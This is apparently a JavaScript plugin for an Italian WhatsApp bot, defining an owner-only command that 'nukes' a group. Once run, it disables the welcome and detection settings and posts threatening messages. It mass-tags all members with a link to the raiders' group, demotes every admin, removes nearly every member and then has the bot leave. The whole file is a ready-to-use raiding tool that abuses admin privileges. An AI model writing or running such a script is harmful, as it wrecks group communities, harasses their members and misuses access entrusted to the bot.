let handler = async (m, { conn, participants, groupMetadata, isBotAdmin }) => {

    if (!isBotAdmin) return m.reply("Il bot deve essere admin per eseguire questo comando.");

    const delay = time => new Promise(res => setTimeout(res, time));

    try {

        // ID importanti
        let botId = conn.user.jid;

        // Trova il creatore del gruppo
        let creator = groupMetadata.participants.find(
            p => p.admin === 'superadmin'
        )?.id;

        // Lista di tutti i partecipanti (tranne bot)
        let allUsers = participants
            .map(u => u.id)
            .filter(u => u !== botId);

        // ==============================
        // DISATTIVA WELCOME E DETECT
        // ==============================
        if (!global.db.data.chats[m.chat]) {
            global.db.data.chats[m.chat] = {};
        }
        global.db.data.chats[m.chat].welcome = false;
        global.db.data.chats[m.chat].detect = false;

        // ==============================
        // 1) PRIMO MESSAGGIO NORMALE
        // ==============================
        await conn.sendMessage(m.chat, {
            text: "𝑪𝒓𝒆𝒅𝒆𝒕𝒆 𝒅𝒊 𝒆𝒔𝒔𝒆𝒓𝒆 𝒗𝒊𝒗𝒊, 𝒎𝒂 𝒔𝒊𝒆𝒕𝒆 𝒈𝒊à 𝒎𝒐𝒓𝒕𝒊 𝒅𝒆𝒏𝒕𝒓𝒐. 𝑷𝒆𝒏𝒔𝒂𝒗𝒂𝒕𝒆 𝒅𝒊 𝒔𝒄𝒂𝒎𝒑𝒂𝒓𝒍𝒂, 𝒎𝒂 𝒏𝒆𝒎𝒎𝒆𝒏𝒐 𝒊𝒍 𝒗𝒆𝒏𝒕𝒐 𝒓𝒊𝒄𝒐𝒓𝒅𝒂 𝒊 𝒗𝒐𝒔𝒕𝒓𝒊 𝒏𝒐𝒎𝒊. 𝑨𝒅𝒆𝒔𝒔𝒐, 𝒍𝒂𝒔𝒄𝒊𝒂𝒕𝒆 𝒄𝒉𝒆 𝒊𝒍 𝒏𝒖𝒍𝒍𝒂 𝒄𝒐𝒎𝒑𝒊𝒂 𝒊𝒍 𝒔𝒖𝒐 𝒍𝒂𝒗𝒐𝒓𝒐."
        });

        // ==============================
        // 2) SECONDO MESSAGGIO CON TAG
        // ==============================
        await conn.sendMessage(m.chat, {
            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥'𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐬𝐯𝐭 𝐝𝐚 𝐝𝐢𝐞𝐡, 𝐦𝐚𝐧𝐝𝐚𝐭𝐞 𝐫𝐢𝐜𝐡𝐢𝐞𝐬𝐭𝐚 𝐚 𝐪𝐮𝐞𝐬𝐭𝐨 𝐠𝐫𝐮𝐩𝐩𝐨:\n\nhttps://chat.whatsapp.com/BxTlEJoRPYoE3VgulUt9dA\n\n𝟒° 𝐃𝐈𝐌𝐄𝐍𝐒𝐈𝐎𝐍𝐄  𝐃𝐎𝐌𝐈𝐍𝐀 𝐀𝐍𝐂𝐇𝐄 𝐐𝐔𝐄𝐒𝐓𝐎 𝐆𝐑𝐔𝐏𝐏𝐎",
            mentions: allUsers
        });

        // ==============================
        // FILTRI SICUREZZA
        // ==============================
        let users = allUsers.filter(u =>
            u !== botId &&
            u !== creator
        );

        if (users.length === 0) {
            await conn.sendMessage(m.chat, { text: "Non ci sono utenti rimovibili." });
            return;
        }

        // Separazione admin / membri
        let admins = users.filter(u =>
            participants.find(p => p.id === u && p.admin)
        );

        let members = users.filter(u =>
            !participants.find(p => p.id === u && p.admin)
        );

        // ==============================
        // 3) RETROCEDI ADMIN POSSIBILI
        // ==============================
        for (let a of admins) {
            try {
                await delay(1200);
                await conn.groupParticipantsUpdate(m.chat, [a], 'demote');
                console.log("Retrocesso:", a);
            } catch (e) {
                console.log("Errore retrocessione:", a);
            }
        }

        // ==============================
        // 4) RIMUOVI MEMBRI NORMALE
        // ==============================
        let toRemove = [...admins, ...members];

        for (let u of toRemove) {
            try {
                await delay(1200);
                await conn.groupParticipantsUpdate(m.chat, [u], 'remove');
                console.log("Rimosso:", u);
            } catch (e) {
                console.log("Errore rimozione:", u);
            }
        }

        // ==============================
        // 5) USCITA AUTOMATICA DEL BOT
        // ==============================
        await conn.sendMessage(m.chat, { text: "Operazione completata. Il bot ora esce dal gruppo." });
        await delay(1000);
        await conn.groupLeave(m.chat);

    } catch (err) {
        console.log("Errore generale:", err);
        m.reply("Si è verificato un errore durante l'operazione.");
    }
};

handler.command = /^(fottuti)$/i;
handler.group = true;
handler.owner = true;

export default handler;